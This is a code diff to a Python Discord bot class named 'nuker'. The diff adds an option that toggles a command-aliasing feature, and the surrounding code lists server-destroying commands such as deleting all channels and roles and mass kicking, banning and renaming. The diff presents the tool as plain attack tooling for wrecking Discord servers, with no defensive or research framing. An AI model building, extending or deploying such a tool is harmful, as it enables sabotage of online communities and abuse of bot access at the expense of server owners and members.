@@ -1,10 +1,10 @@
 import discord, requests, random, string, asyncio, threading, json, time
 
 class nuker(discord.Client):
-    def __init__(self, token, prefix="!", invis=True, ownerid=None):
+    def __init__(self, token, prefix="!", invis=True, ownerid=None, assignCmd=True):
         self.token = token
         self.prefix = prefix
-        self.infos = ["delchannels", "delroles", "masschannel", "massrole", "massnick", "masskick", "massban", "assignCmd"]
+        self.infos = ["delchannels", "delroles", "masschannel", "massrole", "massnick", "masskick", "massban"]
         self.commands = {}
         self.bot = discord.Client(intents=discord.Intents.all())
         @self.bot.event
@@ -24,15 +24,16 @@ class nuker(discord.Client):
             command = msg.content.split(' ')[0][1:]
             args = msg.content.split(' ')[1:]
 
-            if command == "assignCmd":
-                try:
-                    name = args[0]
-                    cmdname = args[1]
-                    self.assignCommand(cmdname, name)
-                except Exception as e:
-                    print(e)
-                    pass
-                return
+            if assignCmd:
+                if command == "assignCmd":
+                    try:
+                        name = args[0]
+                        cmdname = args[1]
+                        self.assignCommand(cmdname, name)
+                    except Exception as e:
+                        print(e)
+                        pass
+                    return
             try:
                 cmd = self.commands[command]
                 if cmd == "delchannels":
